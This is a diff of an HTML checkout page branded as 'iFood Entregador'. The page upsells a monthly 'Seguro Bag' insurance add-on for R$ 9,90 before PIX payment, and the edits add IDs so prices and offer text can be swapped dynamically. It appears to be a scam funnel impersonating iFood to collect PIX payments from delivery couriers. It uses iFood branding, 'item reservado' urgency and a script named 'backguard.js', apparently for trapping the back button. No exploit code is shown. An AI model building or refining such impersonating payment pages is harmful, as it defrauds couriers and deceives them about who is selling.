@@ -7,7 +7,7 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
     <title>iFood Entregador - Proteção extra</title>
-    <meta name="description" content="Escolha se deseja adicionar o Seguro Bag antes de finalizar seu pagamento.">
+    <meta name="description" content="Escolha se deseja adicionar proteção ao item antes de finalizar seu pagamento.">
     <script>
         try {
             if (sessionStorage.getItem('ifoodbag.orderbumpIntro') === '1') {
@@ -19,14 +19,14 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.2">
-    <link rel="stylesheet" href="orderbump.css?v=4">
+    <link rel="stylesheet" href="orderbump.css?v=6">
     <script src="/backguard.js?v=1.6"></script>
 </head>
 <body data-page="orderbump">
     <div id="orderbump-intro" class="orderbump-intro" aria-hidden="true">
         <div class="orderbump-intro__content">
             <img src="assets/ifoodentregadores-wink-v1.svg" alt="">
-            <span class="orderbump-intro__line"><strong>Promoção de Seguro Bag liberada</strong></span>
+            <span class="orderbump-intro__line"><strong id="bump-intro-offer">Promoção de Seguro Bag liberada</strong></span>
             <span class="orderbump-intro__loader"><i></i></span>
         </div>
     </div>
@@ -52,17 +52,18 @@
                             Proteção opcional
                         </span>
                         <h1>Proteção para sua rotina, sem complicação</h1>
-                        <p>Adicione por R$ 9,90/mês ou siga sem o seguro. Sua reserva continua garantida.</p>
+                        <p>Adicione por <strong id="bump-display-price">R$ 9,90</strong>/mês ou siga sem o seguro. Sua reserva continua garantida.</p>
                     </div>
                     <div class="bump-visual" aria-label="Seguro Bag com cobertura para a bag">
-                        <img src="assets/seguro-bag-clean-v2.png" alt="Seguro Bag: proteção contra roubo, furto, rasgos e desgaste">
+                        <img id="bump-visual-image" src="assets/seguro-bag-clean-v2.png" alt="Seguro Bag: proteção contra roubo, furto, rasgos e desgaste">
+                        <span class="bump-visual__shield" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 2 4 5v6c0 5.1 3.4 9.8 8 11 4.6-1.2 8-5.9 8-11V5l-8-3Zm-1 14-3.5-3.5 1.4-1.4 2.1 2.1 4.6-4.6 1.4 1.4-6 6Z"/></svg></span>
                     </div>
                 </div>
                 <aside class="bump-decision" aria-label="Adicionar Seguro Bag">
                     <div class="bump-reserved"><i aria-hidden="true"></i>Seu item continua reservado</div>
                     <div class="bump-decision__heading">
                         <span>Oferta antes do pagamento</span>
-                        <h2>Adicionar Seguro Bag?</h2>
+                        <h2 id="bump-offer-heading">Adicionar Seguro Bag?</h2>
                         <p>Escolha opcional. Decida e avance para o PIX.</p>
                     </div>
                     <div class="bump-order-item">
@@ -70,9 +71,10 @@
                         <div><small>Item reservado</small><strong id="bump-item-name">Bag do iFood</strong></div>
                         <svg class="bump-order-item__check" viewBox="0 0 24 24" aria-hidden="true"><path d="m9.2 16.6-4.3-4.3 1.8-1.8 2.5 2.5 7.9-7.9 1.8 1.8-9.7 9.7Z"/></svg>
                     </div>
+                    <p class="bump-coverage-note" id="bump-coverage-note">Em caso de roubo, furto ou dano à bag, a cobertura é analisada conforme os limites e as exclusões do plano.</p>
                     <div class="bump-price-box">
                         <div><span>Pedido atual</span><strong id="bump-base-total">R$ 0,00</strong></div>
-                        <div class="bump-price-box__insurance"><span>Seguro Bag <small>mensal</small></span><strong>+ R$ 9,90</strong></div>
+                        <div class="bump-price-box__insurance"><span><span id="bump-insurance-name">Seguro Bag</span> <small>mensal</small></span><strong id="bump-insurance-price">+ R$ 9,90</strong></div>
                         <div class="bump-price-box__total"><span>Total de hoje</span><strong id="bump-total">R$ 0,00</strong></div>
                     </div>
                     <div class="action-stack bump-actions">
@@ -87,6 +89,6 @@
     </main>
     <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
     <footer class="footer"><p>&copy; 2026 iFood. Todos os direitos reservados.</p></footer>
-    <script src="script.js?v=11.3" defer></script>
+    <script src="script.js?v=11.9" defer></script>
 </body>
 </html>
